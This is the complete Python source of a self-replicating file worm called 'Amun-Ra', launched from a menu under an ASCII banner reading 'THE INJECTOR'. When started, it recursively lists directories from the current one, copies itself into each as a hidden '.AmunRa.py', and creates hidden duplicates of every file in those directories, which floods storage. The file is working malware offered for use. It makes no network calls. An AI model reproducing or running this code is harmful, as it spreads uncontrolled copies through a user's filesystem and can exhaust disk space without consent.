import os
import shutil
import time
from colorama import init
from termcolor import colored

init()
c = colored
BANNER = (rf"""
             .                                                      .
           .n                   .                 .                  n.
     .   .dP                  dP                   9b                 9b.    .
    4    qXb         .       dX                     Xb       .        dXp     t
   dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
   9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
    9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
     `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
       `9XXXXXXXXXXXP' `9XX'          `98v8P'         `XXP' `9XXXXXXXXXXXP'
           ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                           )b.  .dbo.dP'`v'`9b.odb.  .dX(
                         ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                        dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                       dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                       9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                        `'      9XXXXXX(   )XXXXXXP      `'
                                 XXXX X.`v'.X XXXX
                                 XP^X'`b   d'`X^XX
                                 X. 9  `   '  P )X
                                 `b  `       '  d'
                                  `             '

                                    :      L.                                       
                                    Ef     EW:        ,ft   j.                      
            ..           ..       : E#t    E##;       t#E   EW,                   ..
           ;W,          ,W,     .Et E#t    E###t      t#E   E##j                 ;W,
          j##,         t##,    ,W#t E#t    E#fE#f     t#E   E###D.              j##,
         G###,        L###,   j###t E#t fi E#t D#G    t#E   E#jG#W;            G###,
       :E####,      .E#j##,  G#fE#t E#t L#jE#t  f#E.  t#E   E#t t##f         :E####,
      ;W#DG##,     ;WW; ##,:K#i E#t E#t L#LE#t   t#K: t#E   E#t  :K#E:      ;W#DG##,
     j###DW##,    j#E.  ##f#W,  E#t E#tf#E:E#t    ;#W,t#E   E#KDDDD###i    j###DW##,
    G##i,,G##,  .D#L    ###K:   E#t E###f  E#t     :K#D#E   E#f,t#Wi,,,   G##i,,G##,
  :K#K:   L##, :K#t     ##D.    E#t E#K,   E#t      .E##E   E#t  ;#W:   :K#K:   L##,
 ;##D.    L##, ...      #G      ..  EL     ..         G#E   DWi   ,KK: ;##D.    L##,
 ,,,      .,,           j           :                  fE              ,,,      .,, 
                                                        ,                           
                                 ---- THE INJECTOR ----
                                      | S3R43o3 |
                                
                            Choose an Option:
                                    
                                        1) Start Amun-Ra
    
                                        0) Exit""") +'\n'





class Amunra:
    
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
            
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
            
        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration
        
        # get own absolute path
        self.own_path = os.path.realpath(__file__)
        
        
    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    
    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".AmunRa.py")
            # copy the script in the new directory with similar name
            shutil.copyfile(self.own_path, destination)
            
    
    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source, destination)
                        
                        
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_files()
        
def main():
    options = {
        1: 'Start Amun-Ra',
        0: 'Exit'
    }
    print(c(BANNER, 'red', attrs=['bold']))
    choice = int(input('                                        '))
    if choice not in options:
        print(c('Invalid option!', 'red', attrs=['bold']))
        exit()
    elif choice == 1:
        print(c('>>>>> Amun-Ra started...','red',attrs=['bold']))
        time.sleep(0.8)
        current_directory = os.path.abspath("")
        worm = Amunra(path=current_directory)
        worm.start_worm_actions()
    elif choice == 0:
        exit(0)
            
if __name__ == "__main__":
    main()